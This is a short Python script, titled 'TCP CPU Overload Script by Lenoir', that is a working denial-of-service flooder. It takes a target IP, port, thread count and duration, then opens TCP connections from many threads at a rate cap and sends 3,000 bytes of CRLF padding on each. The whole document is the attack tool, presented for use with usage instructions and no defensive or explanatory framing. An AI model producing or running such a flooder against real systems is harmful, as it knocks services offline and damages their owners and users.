#!/usr/bin/python
# -*- coding: utf-8 -*-
# TCP CPU Overload Script by Lenoir
from socket import create_connection
from sys import argv
from threading import Thread
from time import sleep, time

print("TCP CPU Overload by Lenoir")
help = f"Usage: python {argv[0]} <IP> <port> <threads> <duration, in seconds> <optional: max packets per second, default: 1000>"
if len(argv)<5: exit(help)

ip = argv[1]
port = exit("The port number must be in the range of 1-65535") if not argv[2].isdigit() or not 0<int(argv[2])<65536 else int(argv[2])
threads = exit(help) if not str(argv[3]).isdigit() or int(argv[3])<1 else int(argv[3])
timed = exit(help) if not str(argv[4]).isdigit() or int(argv[4])<1 else int(argv[4])

maxpersec = 1000 if len(argv)<6 else exit(help) if not str(argv[5]).isdigit() else int(argv[5])
iterater = 0
data = b'\r\n' * 1500

# Show packets per second while attacking
show_pps = False

def run():
   global iterater
   for _ in range(500000*500000):
         if maxpersec>iterater:
             try: create_connection((ip, port), 10).send(data)
             except: continue
             iterater += 1
             continue
         sleep(1)

print(f"Flooding {ip}:{port} with {threads} threads for {timed} seconds...")
for _ in range(threads): Thread(target=run, daemon=True).start()
start = time()
while int(time() - start)<timed:
   sleep(1)
   if show_pps: print("Packets per second:", iterater)
   iterater = 0
print("Done")
